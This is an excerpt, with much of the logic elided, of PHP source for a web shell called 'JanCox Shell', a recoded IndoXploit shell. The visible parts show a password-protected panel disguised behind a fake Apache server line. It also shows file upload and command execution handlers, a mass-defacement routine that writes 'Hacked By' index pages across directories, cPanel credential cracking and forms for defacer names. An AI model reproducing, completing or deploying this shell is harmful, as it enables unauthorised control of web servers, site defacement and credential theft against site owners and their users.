...
$auth_pass = "3531909acf1109b0cfd5e7487f5818c8";
$color = "#00ff00";
...
<address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #ffffff; } 
    </style> 
    <right>
    <form method=post> 
...
if($_GET['do'] == 'upload') {
 ...
 elseif($_GET['do'] == 'cmd') {
	...
	function gass(){
		...
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				...
				echo "<br>";
				echo "<center><br><h3>$n rata kan gan </h3></center><br>";
					}
	...
	function gass_all(){
		...
		$key = $key+1;
	echo "<center><br><h3>$key rata dah  </h3></center><br>"; }
	...
	elseif($_POST['mass'] == 'massdeface') {
		...
		<input type='text' name='d_file' value='monkey.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Monkey B Luffy</textarea><br>
...
elseif($_GET['do'] == 'about') {
    ...
    echo '<center>JanCox Shell<hr>IndoXploit Shell Recoded By 0x1999 -> Saiia Edit Lagy :(<br>For More Script Visit <a href="http://cr1p.blogspot.com/">Here</a>';
...
echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='hekel' size='50' value='kakatoji'><br>
		<u>Team</u>: <br>
 ...
 elseif($_GET['do'] == 'cpanel') {
	if($_POST['crack']) {
		...
		if($i == 0) {
			...
			echo "<br>Nemu ".$i." Cpanel by <font color=lime>kakatoji</font>";
		}
	} else {
		echo "<center>
		<form method='post'>
	...
	if($_POST['hajar']) {
		...
		<input type='text' size='50' name='config_dir' value='$dir'><br><br>
		Set Title: <br>
		<input type='text' name='new_title' value='Hacked By kakatoji' placeholder='New Title'><br><br>
	...
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='kakatoji'><br>
		<u>Domains</u>: <br>
